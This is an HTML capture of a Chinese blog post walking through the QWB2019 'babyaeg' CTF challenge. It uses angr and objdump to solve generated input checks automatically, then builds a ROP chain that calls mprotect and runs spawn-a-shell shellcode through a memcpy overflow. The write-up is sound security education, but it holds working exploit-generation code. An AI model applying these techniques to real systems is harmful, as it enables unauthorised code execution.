@@ -1,0 +1,553 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no">
+<meta name="author" content="lxf">
+
+
+
+<meta name="description" content="逆向首先，让我们先来简单的逆向一下这个程序，该程序的接收命令行参数作为输入，然后将我们的输入16进制解码以后放到了bss段上的一个数组，将我们的输入分奇偶xor了两个常量后，进入了若干干相似的函数 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950if ( a1 ==">
+<meta name="keywords" content="ctf">
+<meta property="og:type" content="article">
+<meta property="og:title" content="QWB2019 babyaeg 详解">
+<meta property="og:url" content="http://yoursite.com/2019/05/28/QWB2019-babyaeg-详解/index.html">
+<meta property="og:site_name" content="Just a binary noob~~">
+<meta property="og:description" content="逆向首先，让我们先来简单的逆向一下这个程序，该程序的接收命令行参数作为输入，然后将我们的输入16进制解码以后放到了bss段上的一个数组，将我们的输入分奇偶xor了两个常量后，进入了若干干相似的函数 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950if ( a1 ==">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2019-06-02T07:54:36.229Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="QWB2019 babyaeg 详解">
+<meta name="twitter:description" content="逆向首先，让我们先来简单的逆向一下这个程序，该程序的接收命令行参数作为输入，然后将我们的输入16进制解码以后放到了bss段上的一个数组，将我们的输入分奇偶xor了两个常量后，进入了若干干相似的函数 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950if ( a1 ==">
+
+<link rel="apple-touch-icon" href="/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="Just a binary noob~~" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/favicon.png">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>QWB2019 babyaeg 详解 | Just a binary noob~~</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: false
+    }
+</script>
+
+
+    <script> yiliaConfig.jquery_ui = [false]; </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+
+</head></html>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/1.jpg" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">lxf</a></h1>
+        </hgroup>
+
+        
+
+        
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">所有文章</a></li>
+                        
+                            <li><a href="/tags/">标签云</a></li>
+                        
+                            <li><a href="/about/">关于我</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" href="/842907395@qq.com" title="Email"></a>
+                            
+                                <a class="fa GitHub" href="#" title="GitHub"></a>
+                            
+                                <a class="fa RSS" href="/atom.xml" title="RSS"></a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/">ctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/算法/">算法</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/编译原理/">编译原理</a></li></ul>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://hexo.io">Hexo</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://pages.github.com/">GitHub</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://moxfive.xyz/">MOxFIVE</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">Just a binary noob~~</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">lxf</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/1.jpg" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">lxf</a></h1>
+            </hgroup>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/tags/">标签云</a></li>
+                
+                    <li><a href="/about/">关于我</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" target="_blank" href="/842907395@qq.com" title="Email"></a>
+                            
+                                <a class="fa GitHub" target="_blank" href="#" title="GitHub"></a>
+                            
+                                <a class="fa RSS" target="_blank" href="/atom.xml" title="RSS"></a>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="标签" friends="友情链接" about="关于我">
+</nav>
+      <div class="body-wrap"><article id="post-QWB2019-babyaeg-详解" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2019/05/28/QWB2019-babyaeg-详解/" class="article-date">
+      <time datetime="2019-05-28T13:13:11.000Z" itemprop="datePublished">2019-05-28</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      QWB2019 babyaeg 详解
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/">ctf</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h2 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h2><p>首先，让我们先来简单的逆向一下这个程序，该程序的接收命令行参数作为输入，然后将我们的输入16进制解码以后放到了bss段上的一个数组，将我们的输入分奇偶xor了两个常量后，进入了若干干相似的函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">if ( a1 == 2 )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = sub_4539579(1LL, 2LL, 3LL, 4LL, 5LL, 6LL);</span><br><span class="line">    srand(v4);</span><br><span class="line">    dword_473CDE0 = strlen(a2[1]) &gt;&gt; 1;</span><br><span class="line">    if ( dword_473CDE0 &lt;= 1000 )</span><br><span class="line">    &#123;</span><br><span class="line">      v15 = 0;</span><br><span class="line">      v14 = 0;</span><br><span class="line">      while ( v15 &lt; 2 * dword_473CDE0 )</span><br><span class="line">      &#123;</span><br><span class="line">        v7 = a2[1][v15];</span><br><span class="line">        v8 = a2[1][v15 + 1];</span><br><span class="line">        v9 = 0;</span><br><span class="line">        v5 = v14++;</span><br><span class="line">        __isoc99_sscanf(&amp;v7, &quot;%02hhx&quot;, &amp;byte_473D120[v5]);</span><br><span class="line">        v15 += 2;</span><br><span class="line">      &#125;</span><br><span class="line">      for ( i = 0; i &lt; dword_473CDE0; ++i )</span><br><span class="line">      &#123;</span><br><span class="line">        if ( (_BYTE)v13 == -31 &amp;&amp; (_BYTE)v12 == 29 &amp;&amp; 8 * (12 * (_BYTE)v13 + (_BYTE)v12) - (_BYTE)v11 == 57 )</span><br><span class="line">        &#123;</span><br><span class="line">          v6 = v13++;</span><br><span class="line">          v12 = v6;</span><br><span class="line">        &#125;</span><br><span class="line">        if ( i &amp; 1 )</span><br><span class="line">          byte_473D120[i] ^= 0xC9u;</span><br><span class="line">        else</span><br><span class="line">          byte_473D120[i] ^= 0xC0u;</span><br><span class="line">        if ( (_BYTE)v13 == -16 &amp;&amp; (_BYTE)v12 == 8 &amp;&amp; 35 * (_BYTE)v13 + 41 * (_BYTE)v12 - (_BYTE)v11 == 70 )</span><br><span class="line">          v11 = ++v13;</span><br><span class="line">      &#125;</span><br><span class="line">      puts(&quot;payload encoded. let&apos;s go!&quot;);</span><br><span class="line">      sub_45394D6(byte_473D120[0], byte_473D121, byte_473D122);</span><br><span class="line">      puts(&quot;end of program&quot;);</span><br><span class="line">      result = 0LL;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      puts(&quot;payload length exceeds 1000byte&quot;);</span><br><span class="line">      result = 0LL;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;usage : ./aeg [hex encoded payload]&quot;);</span><br><span class="line">    result = 0LL;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li><p>第一种类型的check，解若干个方程</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">result = a3;</span><br><span class="line">  if ( a1 != -47 )</span><br><span class="line">    return result;</span><br><span class="line">  result = 122 - a2;</span><br><span class="line">  if ( a2 != 63 )</span><br><span class="line">    return result;</span><br><span class="line">  result = 48 * a1 + 45 * a2 - a3;</span><br><span class="line">  if ( result == 66 )</span><br><span class="line">    result = sub_4539457(byte_473D123, byte_473D124, byte_473D125);</span><br><span class="line">  return result;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>第二种类型的check，根据输入取数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">v13 = a1 - 48;</span><br><span class="line">  v7 = 2;</span><br><span class="line">  v8 = 0;</span><br><span class="line">  v9 = 4;</span><br><span class="line">  v10 = 1;</span><br><span class="line">  v11 = 3;</span><br><span class="line">  v2 = 8;</span><br><span class="line">  v3 = 7;</span><br><span class="line">  v4 = 6;</span><br><span class="line">  v5 = 5;</span><br><span class="line">  v6 = 9;</span><br><span class="line">  v12 = (a1 - 48) % 5;</span><br><span class="line">  result = (unsigned int)*(&amp;v2 + *(&amp;v7 + v12));</span><br><span class="line">  if ( (_DWORD)result == 6 )</span><br><span class="line">    result = sub_4538B9C((unsigned __int8)byte_473D151);</span><br><span class="line">  return result;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>第三种类型的check</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">void *sub_45382EF()</span><br><span class="line">&#123;</span><br><span class="line">  const char *v0; // rax</span><br><span class="line">  void *result; // rax</span><br><span class="line">  char dest; // [rsp+0h] [rbp-50h]</span><br><span class="line">  __int64 v3; // [rsp+8h] [rbp-48h]</span><br><span class="line">  const char *v4; // [rsp+10h] [rbp-40h]</span><br><span class="line">  _BYTE *v5; // [rsp+18h] [rbp-38h]</span><br><span class="line">  __int64 v6; // [rsp+20h] [rbp-30h]</span><br><span class="line">  __int64 i; // [rsp+28h] [rbp-28h]</span><br><span class="line">  const char *v8; // [rsp+30h] [rbp-20h]</span><br><span class="line">  const char *v9; // [rsp+38h] [rbp-18h]</span><br><span class="line">  _BYTE *v10; // [rsp+40h] [rbp-10h]</span><br><span class="line">  void *src; // [rsp+48h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v10 = &amp;unk_473D153;</span><br><span class="line">  v9 = &quot;RSiX4TvM&quot;;</span><br><span class="line">  v8 = &quot;RSiX4TvM&quot;;</span><br><span class="line">  for ( i = 0LL; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = v8++;</span><br><span class="line">    if ( !*v0 )</span><br><span class="line">      break;</span><br><span class="line">  &#125;</span><br><span class="line">  v6 = i;</span><br><span class="line">  while ( *v10 )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = v10;</span><br><span class="line">    v4 = v9;</span><br><span class="line">    v3 = v6;</span><br><span class="line">    while ( --v3 &amp;&amp; *v5 &amp;&amp; *v4 &amp;&amp; *v5 == *v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      ++v5;</span><br><span class="line">      ++v4;</span><br><span class="line">    &#125;</span><br><span class="line">    if ( *v5 == *v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      result = v10;</span><br><span class="line">      goto LABEL_16;</span><br><span class="line">    &#125;</span><br><span class="line">    ++v10;</span><br><span class="line">  &#125;</span><br><span class="line">  result = 0LL;</span><br><span class="line">LABEL_16:</span><br><span class="line">  src = result;</span><br><span class="line">  if ( result )</span><br><span class="line">    result = memcpy(&amp;dest, src, (size_t)&amp;byte_473D120[dword_473CDE0 - (_QWORD)src]);</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>可以看到，第三种类型的check将我们的输入的[51:51+8]与一明文进行比对，然后调用memcpy，把input[51:]全部拷贝到了dest，显然这里就是程序的漏洞点，那么我们只需要过掉前面的check就可以触发漏洞，但是由于程序是在服务端动态生成的，这就导致生成的程序相似，但是不完全相同<br>具体可以包括以下部分</p>
+<ul>
+<li><p>xor的值不同</p>
+</li>
+<li><p>三种类型的check的参数不同</p>
+</li>
+<li><p>dest相对于rbp的偏移不同</p>
+</li>
+<li><p>程序入口点不同</p>
+</li>
+<li><p>程序中还随机插入了一些无关的代码或者函数，导致我们无法预知一些我们感兴趣的地址相对入口点的偏移</p>
+</li>
+</ul>
+<p>这些问题导致我们没有很好的规律来帮助我们来生成exlpoit，于是我决定使用angr来解决这个问题</p>
+<h2 id="利用angr分析二进制文件"><a href="#利用angr分析二进制文件" class="headerlink" title="利用angr分析二进制文件"></a>利用angr分析二进制文件</h2><p>首先我们先得找到main函数的地址,main函数的地址会在<code>call __libc_start_main</code>时被载入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">proj = angr.Project(&quot;1.elf&quot;,auto_load_libs=True);</span><br><span class="line">state = proj.factory.full_init_state();</span><br><span class="line">sm = proj.factory.simulation_manager(state);</span><br><span class="line">sm.explore( find=proj.entry+0x24 ).move(&apos;found&apos;,&apos;active&apos;);</span><br><span class="line">main_addr = sm.one_active.solver.eval( sm.one_active.regs.rdi );</span><br></pre></td></tr></table></figure>
+<p>找到main函数的所有基本块,再从这些基本块中找到调用第一个check函数的基本块，最终获取第一个check函数的地址<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cfg = proj.analyses.CFGFast(regions=[(proj.entry, proj.loader.main_object.max_addr)], force_complete_scan=False);</span><br><span class="line">main_func = cfg.functions.function(main_addr);</span><br><span class="line">block_addr = sorted(main_func.get_call_sites())[-2];</span><br><span class="line">cur_func_addr = main_func.get_call_target(block_addr);</span><br></pre></td></tr></table></figure></p>
+<p>通过符号执行来求得第一类check的所有解<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">ans = &quot;&quot;;</span><br><span class="line">while len(ans)!=48:</span><br><span class="line">	a = claripy.BVS(&apos;x&apos;, 8);</span><br><span class="line">	b = claripy.BVS(&apos;y&apos;, 8);</span><br><span class="line">	c = claripy.BVS(&apos;z&apos;, 8);</span><br><span class="line">		</span><br><span class="line">	func = cfg.functions.function(cur_func_addr);</span><br><span class="line">		</span><br><span class="line">	state = proj.factory.call_state(cur_func_addr,a,b,c);</span><br><span class="line">		</span><br><span class="line">	sm = proj.factory.simulation_manager(state);</span><br><span class="line">	target_block_addr = func.get_call_sites()[0];</span><br><span class="line">	# print &apos;target_block_addr&apos;,hex(target_block_addr);</span><br><span class="line">	# print func.get_call_sites();</span><br><span class="line">		</span><br><span class="line">	sm.explore( find=target_block_addr );</span><br><span class="line">	ans+=chr( sm.found[0].solver.eval(a) );</span><br><span class="line">	ans+=chr( sm.found[0].solver.eval(b) );</span><br><span class="line">	ans+=chr( sm.found[0].solver.eval(c) );</span><br><span class="line">	cur_func_addr = func.get_call_target(target_block_addr);</span><br></pre></td></tr></table></figure></p>
+<p>由于第二类check通过符号执行的方式求解的速度太慢，因此我决定爆破第二类check的答案，但用angr来爆破时需要注意一个问题，就是不能产生符号执行，因为我们给的输入是固定值，一旦产生了符号执行，就会产生针对所有分支的可行路径，同时针对某一状态也会有相应的约束产生，因此，在此题中，我们只需要判断是否有约束产生，就能判断是否发生了符号执行（这里的话我也不理解为什么会产生符号执行）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">while len(ans)!=51:</span><br><span class="line">	func = cfg.functions.function(cur_func_addr);</span><br><span class="line">	target_block_addr = func.get_call_sites()[0];</span><br><span class="line">		</span><br><span class="line">	for i in range(64):</span><br><span class="line">		state = proj.factory.call_state(cur_func_addr,i+48);</span><br><span class="line">		sm = proj.factory.simulation_manager(state);</span><br><span class="line">		sm.explore( find=target_block_addr );</span><br><span class="line">		if sm.found and not sm.found[0].solver.constraints:</span><br><span class="line">			ans+=chr(i+48);</span><br><span class="line">			break;</span><br><span class="line">	target_func_addr = func.get_call_target(target_block_addr);</span><br></pre></td></tr></table></figure></p>
+<p>第三类check是与一常量进行，比较，且该常量位于rodata段上，因此我们只需要将它取出来就是，可以发现的是，该常量在rodata段的偏移为8或者8+5,这取决于是否有干扰的字符串test产生，特判一下就好<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">const_addr = proj.loader.main_object.sections_map[&apos;.rodata&apos;].min_addr+8;</span><br><span class="line">const = state.solver.eval( state.memory.load(const_addr,8)  , cast_to=str  );</span><br><span class="line">if &apos;test&apos; in const:</span><br><span class="line">	const = state.solver.eval( state.memory.load(const_addr+5,8)  , cast_to=str  );</span><br></pre></td></tr></table></figure></p>
+<p>通过执行shell命令，利用objdump来获取xor的两个常量，和dest相对rbp的偏移<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">a = commands.getoutput(r&quot;objdump -M intel -d 1.elf | grep &apos;xor    eax,&apos; &quot;).split(&apos;\n&apos;);</span><br><span class="line">xor2 = int(a[0][-10:],16)&amp;0xff;</span><br><span class="line">xor1 = int(a[1][-10:],16)&amp;0xff;</span><br><span class="line">print hex(xor1),hex(xor2);</span><br><span class="line">a = commands.getoutput(r&quot;objdump -M intel -d 1.elf | grep &apos;lea    rax,\[rbp&apos; &quot;).split(&apos;\n&apos;);</span><br><span class="line">offset = int(a[0][-5:-1],16);</span><br><span class="line">print hex(offset);</span><br></pre></td></tr></table></figure></p>
+<h2 id="Rop链的生成"><a href="#Rop链的生成" class="headerlink" title="Rop链的生成"></a>Rop链的生成</h2><p>ROPgadgets了一下，发现该程序中没有比较好的gadgets可以利用，但是大家可以注意到，在main函数开始的地方，调用了一个什么都没做的函数，但是如果我们打开它的反汇编窗口<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000036715D5 48 8B 7D C0                   mov     rdi, [rbp+var_40]</span><br><span class="line">.text:00000000036715D9 48 8B 4D C8                   mov     rcx, [rbp+var_38]</span><br><span class="line">.text:00000000036715DD 48 8B 55 E0                   mov     rdx, [rbp+var_20]</span><br><span class="line">.text:00000000036715E1 48 8B 75 D8                   mov     rsi, [rbp+var_28]</span><br><span class="line">.text:00000000036715E5 48 8B 45 E8                   mov     rax, [rbp+var_18]</span><br><span class="line">.text:00000000036715E9 4D 89 C1                      mov     r9, r8</span><br><span class="line">.text:00000000036715EC 49 89 F8                      mov     r8, rdi</span><br><span class="line">.text:00000000036715EF 48 89 C7                      mov     rdi, rax</span><br><span class="line">.text:00000000036715F2 E8 97 FF FF FF                call    sub_367158E</span><br><span class="line">.text:00000000036715F7 89 45 FC                      mov     [rbp+var_4], eax</span><br><span class="line">.text:00000000036715FA 8B 45 FC                      mov     eax, [rbp+var_4]</span><br><span class="line">.text:00000000036715FD C9                            leave</span><br><span class="line">.text:00000000036715FE C3</span><br></pre></td></tr></table></figure></p>
+<p>可以发现如果rbp可控，那么我们就可以利用这段代码来控制寄存器，因此利用思路为，构造rop链执行mprotect修改payload所在地址为可执行，然后跳转到payload上getshell<br>payload所在地址相对于.bss段结尾的偏移是固定的，因此利用angr和objdump获取该gadgets的地址和payload的地址，而且我们利用的这段gadgets里，用来操控的地址相对rbp的偏移也是不一样的…也需要用objdump来获取一下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">payload_addr = proj.loader.main_object.sections_map[&apos;.bss&apos;].max_addr-999;</span><br><span class="line"></span><br><span class="line">a = commands.getoutput(r&quot;objdump -M intel -d 1.elf | grep &apos;mov    rdx&apos; &quot;).split(&apos;\n&apos;);</span><br><span class="line">rop_chain_addr = int(a[1][1:(a[1].index(&apos;:&apos;))],16);</span><br><span class="line">print hex(rop_chain_addr);</span><br><span class="line"></span><br><span class="line">a = commands.getoutput(r&quot;objdump -M intel -d 1.elf | grep &apos;mov    rsi&apos; &quot;).split(&apos;\n&apos;)</span><br><span class="line">offset2 = int( a[1][-5:-1], 16);</span><br></pre></td></tr></table></figure>
+<p>生成rop链<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">rdi = (payload_addr)-(payload_addr)%0x4000;</span><br><span class="line">rsi = 0x4000;</span><br><span class="line">rdx = 0x1 | 0x2 | 0x4;</span><br><span class="line">payload+= const.ljust(offset,&apos;a&apos;);</span><br><span class="line">payload+= p64( payload_addr+len(payload)+8+8+offset2 );</span><br><span class="line">payload+= p64(rop_chain_addr);</span><br><span class="line"># payload+= &apos;a&apos;*8;</span><br><span class="line">shellcode = asm( shellcraft.amd64.sh() );</span><br><span class="line">payload+= p64(rsi);</span><br><span class="line">payload+= p64(rdx);</span><br><span class="line">payload+= p64(rdi);</span><br><span class="line">payload+= &apos;a&apos;*(offset2-0x18);</span><br><span class="line">payload+= &apos;a&apos;*0x8;</span><br><span class="line">payload+= p64(proj.loader.main_object.plt[&apos;mprotect&apos;]);</span><br><span class="line">payload+= p64(payload_addr+len(payload)+8);</span><br><span class="line">print &apos;shellcode_offset:&apos;,len(payload);</span><br><span class="line">payload+= shellcode;</span><br><span class="line">payload=get(payload,xor1,xor2);</span><br></pre></td></tr></table></figure></p>
